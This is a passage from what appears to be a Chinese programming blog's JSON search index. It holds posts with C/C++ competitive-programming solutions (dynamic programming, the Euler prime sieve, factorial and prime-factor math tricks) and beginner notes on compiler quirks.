?\n和上一题同理，将加法换成乘法。\n#include \u0026lt;cstdio\u0026gt; #include \u0026lt;cstring\u0026gt; int dp[101][101][11], a[101][101]; int main(void) { int t, n, i, j, k; scanf(\u0026#34;%d\u0026#34;, \u0026amp;t); while(t--){ memset(dp, 0, sizeof(dp)); scanf(\u0026#34;%d\u0026#34;, \u0026amp;n); for (i = 0; i \u0026lt; n; ++i) for (j = 0; j \u0026lt;= i; ++j) scanf(\u0026#34;%d\u0026#34;, \u0026amp;a[i][j]); for (i = 0; i \u0026lt; n; ++i) dp[n - 1][i][a[n - 1][i] % 10] = 1; for (i = n - 2; i\u0026gt;= 0; --i) for (j = 0; j \u0026lt;= i; ++j) for (k = 0; k \u0026lt; 10; ++k) if (dp[i + 1][j][k] || dp[i + 1][j + 1][k]) dp[i][j][(k * a[i][j]) % 10] = 1; for (i = 9; i\u0026gt;= 0; --i) if (dp[0][0][i]){printf(\u0026#34;%d\\n\u0026#34;, i); break;} } return 0; } ","date":"2017-12-23","permalink":"/posts/dp-simple/","section":"Posts","summary":"\u003cp\u003e经典之所以能被称为经典，是因为其中蕴含的无限可能。\u003c/p\u003e","title":"简单 DP 题合集"},{"content":"我最喜欢的求素数方法。这也是我最常回顾（抄代码）的一篇文章。\nC 代码 # #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdbool.h\u0026gt; bool flag[10001] = {0}; int p[10001] = {0}; int main() { int i, n, cnt = 0, j; scanf(\u0026#34;%d\u0026#34;, \u0026amp;n); for (i = 2; i \u0026lt;= n; ++i){ if (flag[i] == 0) p[cnt++] = i; for (j = 0; j \u0026lt; cnt \u0026amp;\u0026amp; i * p[j] \u0026lt;= n; ++j){ flag[i * p[j]] = 1; if (i % p[j] == 0) break; } } for (i = 0; i \u0026lt; cnt; ++i) i == cnt - 1 ? printf(\u0026#34;%d\\n\u0026#34;, p[i]) : printf(\u0026#34;%d\u0026#34;, p[i]); return 0; } 说明 # flag 标记下标是否为合数 p 按顺序存放素数 flag[i * p[j]] = 1 筛掉 i 这一素数的 ** 素数倍数 **。 若 i 能整除 p[j] 则跳出循环，等到 p[j]==i 时再筛去 i*p[j] 这个数。即仅在合数的最大因子作为乘数时筛去这一合数。 时间复杂度 O(n) C++ 版本 # 实现上有所改动。\n#include \u0026lt;bits/stdc++.h\u0026gt; using namespace std; const int maxn = 1e7+5; bool np[maxn]{true,true}; vector\u0026lt;int\u0026gt; prime; int main() { int n, m, x; cin \u0026gt;\u0026gt; n \u0026gt;\u0026gt; m; for (int i = 2; i \u0026lt;= n; ++i) { if (!np[i]) prime.push_back(i); for (int j = 0; j \u0026lt; prime.size() \u0026amp;\u0026amp; i*prime[j] \u0026lt;= n; ++j) { np[i*prime[j]] = true; if (i % prime[j] == 0) break; } } for (int i = 1; i \u0026lt;= m; ++i) { scanf(\u0026#34;%d\u0026#34;, \u0026amp;x); printf(\u0026#34;%s\\n\u0026#34;, np[x] ? \u0026#34;No\u0026#34; : \u0026#34;Yes\u0026#34;); } return 0; } ","date":"2017-12-04","permalink":"/posts/euler-sieve/","section":"Posts","summary":"\u003cp\u003e我最喜欢的求素数方法。这也是我最常回顾（抄代码）的一篇文章。\u003c/p\u003e","title":"欧拉筛法求素数"},{"content":"总是让人头疼又令人着迷的数学问题。\n求 $n!$ 首位数 # 使用斯特林公式得到近似结果：\n$$ \\lim_{n\\to+\\infty} {n!\\over{\\sqrt {2 \\pi n}} ({n\\over e})^n} = 1 $$\n之后用 10 的幂计算取首位即可，注意数字较小时特判，代码如下：\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;math.h\u0026gt; const double PI = 3.14159265358979; const double E = 2.718281828; int main() { int n,fn; double log_n_fac; while (scanf(\u0026#34;%d\u0026#34;, \u0026amp;n) != EOF){ log_n_fac = 0.5 * log10(2 * PI *(double)n) + (double)n * log10((double)n / E); log_n_fac -=(int)log_n_fac; fn = pow(10, log_n_fac);//Stirling\u0026#39;s approximation switch(n){ case 0:printf(\u0026#34;1\\n\u0026#34;);break; case 1:printf(\u0026#34;1\\n\u0026#34;);break; case 2:printf(\u0026#34;2\\n\u0026#34;);break; case 3:printf(\u0026#34;6\\n\u0026#34;);break; case 7:printf(\u0026#34;5\\n\u0026#34;);break; case 8:printf(\u0026#34;4\\n\u0026#34;);break; default:printf(\u0026#34;%d\\n\u0026#34;, fn); } } return 0; } 求 $n^n$ 首位 # 方法类似，代码：\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;math.h\u0026gt; int main() { int n; scanf(\u0026#34;%d\u0026#34;,\u0026amp;n); while(n != 0){ printf(\u0026#34;%d\\n\u0026#34;,(int)pow(10,n*log10(n)-(int)(n*log10(n)))); scanf(\u0026#34;%d\u0026#34;,\u0026amp;n); } return 0; } 整数质因子分解 # 从小到大枚举因数，如果这个因数不是素数（如 15），那么之前枚举过的素数已经消耗掉了这个因数（如 3 和 5），因此 n%15 不会为 0。所以这题并不需要筛选素数。\n#include \u0026lt;stdio.h\u0026gt; int n; void solve(){ int i; int m = n; for (i = 2; i \u0026lt;= n; i++){ int cnt = 0; if (m % i) continue; while (m % i == 0){ m /= i; cnt++; } printf(\u0026#34;(%d,%d)\u0026#34;, i, cnt); if (m == 1) break; } printf(\u0026#34;\\n\u0026#34;); } int main(void) { int t,i; scanf(\u0026#34;%d\u0026#34;, \u0026amp;t); for (i = 0; i \u0026lt; t; i++){ scanf(\u0026#34;%d\u0026#34;, \u0026amp;n); solve(); } return 0; } $n!$ 右端的 0 的个数 # 令 $n!=5^m 2 ^p x$，$m,p,x$ 为非负整数。同时由于 $n!$ 中 2 的倍数远多于 5 的倍数，即 $p \u0026gt; m$，所以 m 即为答案。要得到 m，首先找从 1 到 n 中 5 的倍数，即 $\\frac{n}{5}$，而 $25=5^2$，一个数就含有两个 5 在内，因此第二轮我们找从 1 到 $\\frac{n}{5}$ 中 5 的倍数。由于第一轮中已经被拿掉了一个 5，第二轮 25 就只需再拿出一个 5 即可，$\\frac{n}{25}$。第三轮则 $\\frac{n}{125}$，第 $i$ 轮 $\\frac{n}{5^i}$，以此类推：\n#include \u0026lt;stdio.h\u0026gt; int main() { int t,i,n,m,z; scanf(\u0026#34;%d\u0026#34;, \u0026amp;t); for (i = 0; i \u0026lt; t; i++){ scanf(\u0026#34;%d\u0026#34;, \u0026amp;n); m = 5;z = 0; while (n\u0026gt;= m){ z += n / m; m *= 5; } printf(\u0026#34;case #%d:\\n%d\\n\u0026#34;, i, z); } return 0; } ","date":"2017-11-08","permalink":"/posts/math-problems/","section":"Posts","summary":"\u003cp\u003e总是让人头疼又令人着迷的数学问题。\u003c/p\u003e","title":"巧算数学问题"},{"content":"第一篇博文。\n关于类型 # CodeBlocks 使用 MinGW 编译器，long long 类型输出表示为 \u0026quot;%I64d\u0026quot;，且 __int64 合法； EOJ 使用的似乎是 g++ 的 Linux 版本编译器，long long 类型输出表示为 \u0026quot;%lld\u0026quot;， 且 __int64 不合法； long double 类型是合法的，但是在 MinGW 编译器中不能格式化输入 / 输出。%llf，%Lf 这些都不行。 关于 ILE # Idleness Limit Exceeded 常见于交互题。\n在使用多个输出函数连续输出时，有可能产生输出错误，因为在上一个数据还在输出缓冲区中时，下一个 printf 就把另一个数据加入输出缓冲区，冲掉了原来的数据，造成输出错误。\n解决方案：\n在 printf 后加上 fflush(stdout)； 使用 cout\u0026lt;\u0026lt;endl 输出似乎效果等同？ 关于其他注意事项 # 变量 / 数组的初始化 scanf 后回车符的吸收 gets 的不安全性 getline 多次使用注意添加 str = \u0026quot;\\n\u0026quot;; getline(cin, str); EOJ 编译器对 getchar(); ... gets(); 的支持似乎不太好？ 经常把 == 写成 = 尽量避免使用非 C 标准库函数，如 itoa, strlwr, strupr 之类 RTE 主要原因：数组越界、指针越界、除以 0、栈溢出…… ","date":"2017-11-08","permalink":"/posts/newbie-note/","section":"Posts","summary":"\u003cp\u003e第一篇博文。\u003c/p\u003e","title":"问题笔记"},{"content":"","date":"0001-01-01","permalink":"/tags/c/c++/","section":"Tags","summary":"","title":"C/C++"},{"content":"","date":"0001-01-01","permalink":"/tags/ci/cd/","section":"Tags","summary":"","title":"CI/CD"}]